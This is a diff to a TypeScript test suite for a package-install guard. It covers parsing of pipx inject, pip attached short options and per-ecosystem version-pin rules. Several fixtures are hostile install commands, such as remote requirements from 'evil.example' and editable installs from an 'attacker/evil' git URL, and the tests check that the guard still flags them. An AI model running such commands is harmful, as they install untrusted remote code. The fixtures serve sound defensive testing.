@@ -285,6 +285,90 @@ describe("parseInstallCommands — pip family", () => {
 		const [cmd] = parseInstallCommands("pipx install poetry");
 		expect(cmd.action).toBe("install_global");
 	});
+
+	// `pipx inject <venv> <pkgs…>` — the first positional is the EXISTING
+	// environment, not a package (finding 2026-06: `pipx inject black
+	// requests==2.31.0` treated `black` as an unpinned package and blocked).
+	it("pipx inject skips the venv target — only the injected specs are packages", () => {
+		const [cmd] = parseInstallCommands("pipx inject black requests==2.31.0");
+		expect(cmd.packages).toEqual([{ kind: "registry", name: "requests", version: "==2.31.0" }]);
+	});
+
+	it("pipx inject with several specs keeps them all (venv alone is dropped)", () => {
+		const [cmd] = parseInstallCommands("pipx inject black requests==2.31.0 urllib3==2.2.0");
+		expect(cmd.packages.map((p) => (p.kind === "registry" ? p.name : p.kind))).toEqual([
+			"requests",
+			"urllib3",
+		]);
+	});
+
+	it("pipx inject with flags before the venv still drops exactly the venv", () => {
+		const [cmd] = parseInstallCommands("pipx inject --include-apps black requests==2.31.0");
+		expect(cmd.packages.map((p) => (p.kind === "registry" ? p.name : p.kind))).toEqual(["requests"]);
+	});
+
+	it("pipx inject with NO package specs yields no packages (nothing to gate)", () => {
+		const [cmd] = parseInstallCommands("pipx inject black");
+		expect(cmd.packages).toEqual([]);
+	});
+
+	it("pipx INSTALL keeps its first positional as the package (only inject skips)", () => {
+		const [cmd] = parseInstallCommands("pipx install black");
+		expect(cmd.packages.map((p) => (p.kind === "registry" ? p.name : p.kind))).toEqual(["black"]);
+	});
+
+	it("a malicious spec in the inject list is still classified (the guard still sees it)", () => {
+		const [cmd] = parseInstallCommands("pipx inject black git+https://github.com/attacker/evil");
+		expect(cmd.packages[0].kind).toBe("git_url");
+	});
+});
+
+// ATTACHED short-option values (finding 2026-06, same class as git `-mfix`):
+// optparse-style pip accepts the value glued to the flag. Each must surface the
+// same guard signal as the separated form — previously they parsed as unknown
+// flags and the signal was silently lost.
+describe("pip attached short-option values", () => {
+	it("`-rreqs.txt` is a manifest install, same as `-r reqs.txt`", () => {
+		const [cmd] = parseInstallCommands("pip install -rrequirements.txt");
+		expect(cmd.manifestFile).toBe("requirements.txt");
+		expect(cmd.fromManifest).toBe(true);
+	});
+
+	it("`-rhttps://…` (remote requirements) is captured, not silently skipped", () => {
+		const [cmd] = parseInstallCommands("pip install -rhttps://evil.example/r.txt");
+		expect(cmd.manifestFile).toBe("https://evil.example/r.txt");
+	});
+
+	it("`-ihttps://mirror` is a custom registry, same as `-i https://mirror`", () => {
+		const [cmd] = parseInstallCommands("pip install -ihttps://mirror.example/simple requests==2.31.0");
+		expect(cmd.customRegistry).toBe("https://mirror.example/simple");
+	});
+
+	it("`-egit+URL` is an editable git spec the guard classifies, same as `-e git+URL`", () => {
+		const [cmd] = parseInstallCommands("pip install -egit+https://github.com/attacker/evil");
+		expect(cmd.packages[0].kind).toBe("git_url");
+	});
+
+	it("`-cconstraints.txt` marks constraints without inventing a package", () => {
+		const [cmd] = parseInstallCommands("pip install -cconstraints.txt requests==2.31.0");
+		expect(cmd.packages.map((p) => (p.kind === "registry" ? p.name : p.kind))).toEqual(["requests"]);
+	});
+
+	it("separated forms are unchanged (`-r reqs.txt`, `-i URL`, `-e spec`)", () => {
+		const [withR] = parseInstallCommands("pip install -r requirements.txt");
+		expect(withR.manifestFile).toBe("requirements.txt");
+		const [withI] = parseInstallCommands("pip install -i https://mirror.example/simple requests==2.31.0");
+		expect(withI.customRegistry).toBe("https://mirror.example/simple");
+		const [withE] = parseInstallCommands("pip install -e git+https://github.com/attacker/evil");
+		expect(withE.packages[0].kind).toBe("git_url");
+	});
+
+	it("unrelated short flags with attached text are not misread as r/i/c/e values", () => {
+		// `-q`-style flags carry no value; a flag like `-U` (upgrade) must not match.
+		const [cmd] = parseInstallCommands("pip install -U requests==2.31.0");
+		expect(cmd.packages.map((p) => (p.kind === "registry" ? p.name : p.kind))).toEqual(["requests"]);
+		expect(cmd.manifestFile).toBeUndefined();
+	});
 });
 
 // ROUND-TRIP PIN CONTRACT (finding: PyPI operators lost during parsing). raw
@@ -677,10 +761,43 @@ describe("pinnedVersionViolation — per-ecosystem unit cases", () => {
 		expect(pinnedVersionViolation(reg("lodash", "4.17"), "npm")).not.toBeNull();
 	});
 
-	it("BLOCKS a pip range operator residue (`requests` major-only `2`)", () => {
-		// pip strips the operator, so `requests>=2` parses to version "2" — still
-		// caught by the major-only rule.
-		expect(pinnedVersionViolation(reg("requests", "2"), "pypi")).not.toBeNull();
+	it("BLOCKS pip range operators (the parser RETAINS them, so a range never masquerades as a pin)", () => {
+		// classifyPipSpec keeps the comparison operator, so `requests>=2` reaches
+		// the pin check as ">=2" — a range, blocked. A BARE "2" is different:
+		// under PEP 440, `==2` is EXACT (it matches only release 2, never 2.1),
+		// so it is allowed — see the ecosystem-rules cases below (finding 2026-06).
+		expect(pinnedVersionViolation(reg("requests", ">=2"), "pypi")).not.toBeNull();
+		expect(pinnedVersionViolation(reg("requests", "~=2.31"), "pypi")).not.toBeNull();
+		expect(pinnedVersionViolation(reg("requests", "!=2.31.0"), "pypi")).not.toBeNull();
+	});
+
+	// Ecosystem-aware exact-pin rules (finding 2026-06): one universal
+	// major.minor.patch regex falsely blocked valid exact pins in ecosystems
+	// whose version grammar is not three-component semver.
+	it("ALLOWS PEP 440 exact pins that are not three-component (`==24.2`, post/rc/dev/local)", () => {
+		expect(pinnedVersionViolation(reg("packaging", "==24.2"), "pypi")).toBeNull();
+		expect(pinnedVersionViolation(reg("packaging", "==24"), "pypi")).toBeNull();
+		expect(pinnedVersionViolation(reg("x", "==1.0.post1"), "pypi")).toBeNull();
+		expect(pinnedVersionViolation(reg("x", "==2.0.0rc1"), "pypi")).toBeNull();
+		expect(pinnedVersionViolation(reg("x", "==1.2.3.dev4"), "pypi")).toBeNull();
+		expect(pinnedVersionViolation(reg("x", "==1.2+local.7"), "pypi")).toBeNull();
+		expect(pinnedVersionViolation(reg("x", "===1.0"), "pypi")).toBeNull(); // arbitrary equality
+	});
+
+	it("still BLOCKS PyPI floating forms (`==24.*` prefix match, dist-tags)", () => {
+		expect(pinnedVersionViolation(reg("packaging", "==24.*"), "pypi")).not.toBeNull();
+		expect(pinnedVersionViolation(reg("packaging", "latest"), "pypi")).not.toBeNull();
+	});
+
+	it("ALLOWS a RubyGems exact two-component version (`'7.1'` is exact to Gem::Version)", () => {
+		expect(pinnedVersionViolation(reg("rails", "7.1"), "rubygems")).toBeNull();
+		expect(pinnedVersionViolation(reg("rails", "7.1.0.rc1"), "rubygems")).toBeNull();
+	});
+
+	it("keeps npm/cargo/go partials BLOCKED (they really do float in those ecosystems)", () => {
+		expect(pinnedVersionViolation(reg("lodash", "4.17"), "npm")).not.toBeNull();
+		expect(pinnedVersionViolation(reg("serde", "=1.2"), "cargo")).not.toBeNull();
+		expect(pinnedVersionViolation(reg("x", "v1.2"), "go")).not.toBeNull();
 	});
 
 	it("BLOCKS a go dist-tag (`x@latest`)", () => {
